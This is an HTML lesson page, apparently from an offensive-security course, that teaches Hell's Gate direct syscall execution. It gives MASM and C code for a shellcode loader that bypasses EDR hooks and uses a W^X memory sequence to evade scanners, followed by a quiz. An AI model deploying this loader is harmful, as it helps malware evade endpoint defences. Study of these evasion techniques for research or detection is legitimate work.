@@ -1,0 +1,259 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Module 6: Direct Syscall Execution - HellsGate Course</title>
+<link rel="icon" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'><text y='.9em' font-size='90'>&#x1F525;</text></svg>">
+<link rel="stylesheet" href="../../../assets/course.css">
+<style>:root{--accent:#e11d48;--accent2:#be123c;--gradient:linear-gradient(135deg,#e11d48,#be123c)}</style>
+</head>
+<body>
+
+<button class="hamburger" onclick="document.querySelector('nav').classList.toggle('open')">&#9776;</button>
+
+<nav>
+<div class="logo">
+<h2>HellsGate Course</h2>
+<span>Dynamic SSN &amp; Direct Syscalls</span>
+</div>
+<a class="home-link" href="../HellsGate_index.html">&larr; Course Home</a>
+<a class="mod-link" href="module1.html"><span class="diff d1">1</span> EDR Hooking</a>
+<a class="mod-link" href="module2.html"><span class="diff d1">2</span> Syscall Architecture</a>
+<a class="mod-link" href="module3.html"><span class="diff d1">3</span> SSN Basics</a>
+<a class="mod-link" href="module4.html"><span class="diff d2">4</span> ntdll Stub Anatomy</a>
+<a class="mod-link" href="module5.html"><span class="diff d2">5</span> Hell's Gate Algorithm</a>
+<a class="mod-link active" href="module6.html"><span class="diff d2">6</span> Direct Syscall Exec</a>
+<a class="mod-link" href="module7.html"><span class="diff d3">7</span> Halo's &amp; Tartarus Gate</a>
+<a class="mod-link" href="module8.html"><span class="diff d3">8</span> Full Chain &amp; Detection</a>
+</nav>
+
+<main>
+<span class="diff-badge medium">Difficulty: Intermediate</span>
+<h1>Module 6: Direct Syscall Execution</h1>
+<p class="subtitle">You have the number. Now invoke the gate.</p>
+
+<div class="card highlight">
+<h4>Putting It All Together</h4>
+<p>In the previous module, we resolved SSNs from ntdll stubs. Now we use those SSNs to execute system calls directly, without ever calling through ntdll.dll. This module covers the Hell's Gate assembly stub, how the SSN is set dynamically at runtime, the calling convention bridge between C and the ASM stub, and a complete working example.</p>
+</div>
+
+<h2>The Hell's Gate Assembly Stub</h2>
+<p>Hell's Gate uses a small assembly function that serves as a reusable syscall trampoline. The SSN is set before calling this stub, and the stub simply moves it into EAX and executes <code>syscall</code>:</p>
+
+<pre><code><span class="lang-tag">ASM</span>; Hell's Gate ASM stub (hellsgate.asm - MASM syntax)
+; This file defines two functions:
+;   HellsGate  - stores the SSN for the next syscall
+;   HellDescent - executes the syscall with the stored SSN
+
+.data
+    wSystemCall DWORD 0h    ; Global variable to hold the current SSN
+
+.code
+
+; HellsGate: Set the SSN for the next syscall
+; Param: WORD wSSN (passed in ECX on x64)
+HellsGate PROC
+    mov wSystemCall, 000h   ; Zero the SSN (clean state)
+    mov wSystemCall, ecx    ; Store the SSN in the global variable
+    ret
+HellsGate ENDP
+
+; HellDescent: Execute the syscall
+; Params: Same as the target Nt* function (passed in RCX, RDX, R8, R9, stack)
+HellDescent PROC
+    mov r10, rcx            ; Save 1st param (syscall clobbers RCX)
+    mov eax, wSystemCall    ; Load the SSN from our global variable
+    syscall                 ; Ring 3 -> Ring 0
+    ret                     ; Return NTSTATUS in RAX
+HellDescent ENDP
+
+END</code></pre>
+
+<div class="card warn">
+<h4>Two-Step Invocation</h4>
+<p>Hell's Gate uses a <strong>two-function pattern</strong>: first call <code>HellsGate(ssn)</code> to set the syscall number, then call <code>HellDescent(params...)</code> to execute the syscall. This design means the SSN is stored in a global variable between the two calls. The alternative (passing the SSN as an extra parameter to a single function) would shift all the real parameters and break the calling convention alignment. The two-step approach keeps the parameter layout identical to the original Nt* function signature.</p>
+</div>
+
+<h2>C Function Declarations</h2>
+<p>To call the assembly functions from C, Hell's Gate declares them as external functions with the appropriate signatures:</p>
+
+<pre><code><span class="lang-tag">C</span>// External declarations for the ASM stubs (from main.c)
+extern VOID HellsGate(WORD wSystemCall);
+extern NTSTATUS HellDescent(...);
+
+// The HellDescent function uses varargs (...) because it serves as
+// a generic syscall stub. The actual parameters depend on which
+// Nt* function you're invoking.
+
+// Usage pattern:
+//   1. Call HellsGate(ssn) to set the SSN
+//   2. Call HellDescent(param1, param2, ...) with the Nt* function's parameters
+//   3. HellDescent returns the NTSTATUS result</code></pre>
+
+<h2>The x64 Calling Convention</h2>
+<p>Understanding the x64 calling convention is essential for direct syscalls. The Windows x64 ABI passes the first four integer/pointer parameters in registers:</p>
+
+<table>
+<tr><th>Parameter</th><th>Register</th><th>After <code>mov r10, rcx</code></th></tr>
+<tr><td>1st parameter</td><td>RCX</td><td>Moved to R10 (kernel reads from R10)</td></tr>
+<tr><td>2nd parameter</td><td>RDX</td><td>Stays in RDX</td></tr>
+<tr><td>3rd parameter</td><td>R8</td><td>Stays in R8</td></tr>
+<tr><td>4th parameter</td><td>R9</td><td>Stays in R9</td></tr>
+<tr><td>5th+ parameters</td><td>Stack</td><td>Remain on the stack</td></tr>
+</table>
+
+<p>When <code>HellDescent</code> is called from C, the compiler sets up registers and stack exactly as if calling the real Nt* function. The assembly stub then does <code>mov r10, rcx</code> (matching what ntdll does) and executes <code>syscall</code>. The kernel sees the same register layout it would see from a normal ntdll call.</p>
+
+<div class="diagram">
+<h4 style="color:var(--accent);margin-bottom:15px;text-align:center">Direct Syscall Execution Flow</h4>
+<div class="flow">
+<div class="box">C code:<br><code>HellsGate(ssn)</code></div>
+<div class="arrow">&rarr;</div>
+<div class="box y">ASM stores SSN<br>in global var</div>
+<div class="arrow">&rarr;</div>
+<div class="box">C code:<br><code>HellDescent(args)</code></div>
+<div class="arrow">&rarr;</div>
+<div class="box hl">ASM: mov r10,rcx<br>mov eax,SSN<br>syscall</div>
+<div class="arrow">&rarr;</div>
+<div class="box g">Kernel<br>NTSTATUS</div>
+</div>
+</div>
+
+<h2>Complete Working Example</h2>
+<p>Here is how Hell's Gate uses the resolved SSNs to perform a classic shellcode injection sequence. This demonstrates the entire chain from SSN resolution to syscall execution:</p>
+
+<pre><code><span class="lang-tag">C</span>// From main.c - Shellcode execution using resolved syscalls
+// (VX_TABLE 'Table' has been populated by GetVxTableEntry calls)
+
+// Step 1: Allocate RW memory for shellcode
+PVOID lpAddress = NULL;
+SIZE_T sDataSize = sizeof(shellcode);
+
+HellsGate(Table.NtAllocateVirtualMemory.wSystemCall);
+NTSTATUS status = HellDescent(
+    (HANDLE)-1,          // ProcessHandle: current process (NtCurrentProcess)
+    &lpAddress,           // BaseAddress: let the system choose
+    0,                    // ZeroBits
+    &sDataSize,           // RegionSize: size of shellcode
+    MEM_COMMIT | MEM_RESERVE,  // AllocationType
+    PAGE_READWRITE        // Protect: RW (not RWX -- safer)
+);
+
+// Step 2: Copy shellcode into allocated memory
+// (Using VirtualAlloc'd RW memory, simple memcpy)
+memcpy(lpAddress, shellcode, sizeof(shellcode));
+
+// Step 3: Change protection to RX (execute + read, no write)
+DWORD dwOldProtect = 0;
+
+HellsGate(Table.NtProtectVirtualMemory.wSystemCall);
+status = HellDescent(
+    (HANDLE)-1,          // ProcessHandle
+    &lpAddress,           // BaseAddress
+    &sDataSize,           // NumberOfBytesToProtect
+    PAGE_EXECUTE_READ,    // NewAccessProtection: RX
+    &dwOldProtect         // OldAccessProtection
+);
+
+// Step 4: Create a thread to execute the shellcode
+HANDLE hThread = NULL;
+
+HellsGate(Table.NtCreateThreadEx.wSystemCall);
+status = HellDescent(
+    &hThread,             // ThreadHandle (output)
+    THREAD_ALL_ACCESS,    // DesiredAccess
+    NULL,                 // ObjectAttributes
+    (HANDLE)-1,           // ProcessHandle: current process
+    lpAddress,            // StartRoutine: shellcode address
+    NULL,                 // Argument
+    FALSE,                // CreateFlags: not suspended
+    0,                    // ZeroBits
+    0,                    // StackSize
+    0,                    // MaximumStackSize
+    NULL                  // AttributeList
+);
+
+// Step 5: Wait for the thread to finish
+LARGE_INTEGER Timeout = { 0 };
+
+HellsGate(Table.NtWaitForSingleObject.wSystemCall);
+status = HellDescent(
+    hThread,              // Handle
+    FALSE,                // Alertable
+    NULL                  // Timeout (NULL = infinite)
+);</code></pre>
+
+<div class="card green">
+<h4>What EDR Hooks Miss</h4>
+<p>In this execution flow, <code>NtAllocateVirtualMemory</code>, <code>NtProtectVirtualMemory</code>, <code>NtCreateThreadEx</code>, and <code>NtWaitForSingleObject</code> are never called through ntdll.dll. The EDR's inline hooks on those functions are completely bypassed. The kernel receives and processes the syscalls normally, but the EDR's userland hooks never fire because execution never passes through the hooked code.</p>
+</div>
+
+<h2>The W+X Strategy</h2>
+<p>Notice the two-step memory permission approach in the example above: first allocate as <strong>RW</strong> (writable, for copying shellcode), then change to <strong>RX</strong> (executable, for running it). This is called <strong>W^X</strong> (Write XOR Execute) and avoids the RWX red flag that memory scanners look for. At no point is the memory simultaneously writable and executable.</p>
+
+<table>
+<tr><th>Step</th><th>Permission</th><th>Purpose</th></tr>
+<tr><td>Allocate</td><td><code>PAGE_READWRITE</code> (RW)</td><td>Allows writing shellcode into the buffer</td></tr>
+<tr><td>Copy</td><td>RW</td><td>memcpy shellcode bytes</td></tr>
+<tr><td>Protect</td><td><code>PAGE_EXECUTE_READ</code> (RX)</td><td>Makes code executable, removes write</td></tr>
+<tr><td>Execute</td><td>RX</td><td>Thread starts executing shellcode</td></tr>
+</table>
+
+<h2>Compiling and Linking</h2>
+<p>The Hell's Gate project requires compiling C code and assembling the MASM file, then linking them together. The assembly file (<code>hellsgate.asm</code>) is compiled with the Microsoft Macro Assembler (ml64) and linked with the C object files:</p>
+
+<pre><code><span class="lang-tag">C</span>// Build process (Visual Studio / MSVC):
+// 1. hellsgate.asm  -> ml64.exe /c hellsgate.asm -> hellsgate.obj
+// 2. main.c         -> cl.exe /c main.c           -> main.obj
+// 3. Link:          -> link.exe main.obj hellsgate.obj -> hellsgate.exe
+
+// In Visual Studio:
+// - Add hellsgate.asm to project
+// - Right-click -> Properties -> Item Type: "Microsoft Macro Assembler"
+// - Build as x64 Release (ASM uses x64-only instructions)</code></pre>
+
+<div class="card">
+<h4>Why Inline Assembly Does Not Work</h4>
+<p>MSVC does not support inline assembly (<code>__asm</code>) in x64 builds. This is why Hell's Gate uses a separate .asm file with MASM syntax. Some projects use compiler intrinsics or embed raw bytes, but a separate ASM file is the cleanest approach and allows proper debugging.</p>
+</div>
+
+<div class="quiz" id="quiz6">
+<h4>Pop Quiz: Direct Syscall Execution</h4>
+<div class="quiz-q" data-correct="1">
+<p>Q1: Why does Hell's Gate use two separate functions (HellsGate + HellDescent) instead of one?</p>
+<label data-opt="0"><input type="radio" name="q6_0"> For thread safety -- each thread gets its own SSN</label>
+<label data-opt="1"><input type="radio" name="q6_0"> To keep HellDescent's parameter layout identical to the Nt* function being called</label>
+<label data-opt="2"><input type="radio" name="q6_0"> Because MASM cannot define functions with more than 4 parameters</label>
+<label data-opt="3"><input type="radio" name="q6_0"> The two calls confuse EDR behavioral analysis</label>
+<div class="explain">If the SSN were passed as an extra parameter to a single function, all the real Nt* parameters would shift by one register position, breaking the calling convention. By setting the SSN via a separate call (HellsGate), the HellDescent call receives parameters in exactly the same registers/stack positions as the original Nt* function.</div>
+</div>
+<div class="quiz-q" data-correct="3">
+<p>Q2: In the HellDescent assembly stub, what does <code>mov r10, rcx</code> do?</p>
+<label data-opt="0"><input type="radio" name="q6_1"> Loads the SSN from the global variable</label>
+<label data-opt="1"><input type="radio" name="q6_1"> Stores the return address for sysret</label>
+<label data-opt="2"><input type="radio" name="q6_1"> Sets up the kernel stack pointer</label>
+<label data-opt="3"><input type="radio" name="q6_1"> Saves the first parameter because syscall will overwrite RCX with the return address</label>
+<div class="explain">The syscall instruction stores the return address in RCX, destroying whatever value was there. Since the first function parameter is in RCX (per x64 calling convention), the stub copies it to R10 before executing syscall. The kernel's KiSystemCall64 reads the first parameter from R10.</div>
+</div>
+<div class="quiz-q" data-correct="2">
+<p>Q3: Why does the example allocate memory as PAGE_READWRITE first, then change to PAGE_EXECUTE_READ?</p>
+<label data-opt="0"><input type="radio" name="q6_2"> PAGE_EXECUTE_READWRITE is not a valid protection constant</label>
+<label data-opt="1"><input type="radio" name="q6_2"> The kernel rejects allocations with execute permission</label>
+<label data-opt="2"><input type="radio" name="q6_2"> To avoid RWX memory, which is a major detection indicator for memory scanners</label>
+<label data-opt="3"><input type="radio" name="q6_2"> PAGE_READWRITE is faster for memcpy operations</label>
+<div class="explain">Memory that is simultaneously Writable and Executable (RWX) is a strong indicator of malicious activity. The W^X (Write XOR Execute) approach ensures memory is never both writable and executable at the same time, evading scanners like Moneta that flag RWX regions.</div>
+</div>
+<button class="quiz-btn" onclick="gradeQuiz('quiz6')">Check Answers</button>
+<div class="quiz-result"></div>
+</div>
+
+<div class="nav-btns">
+<a href="module5.html">&larr; Previous: Hell's Gate Algorithm</a>
+<a class="primary" href="module7.html">Next: Halo's &amp; Tartarus Gate &rarr;</a>
+</div>
+</main>
+
+<script src="../../../assets/course.js"></script>
+</body>
+</html>
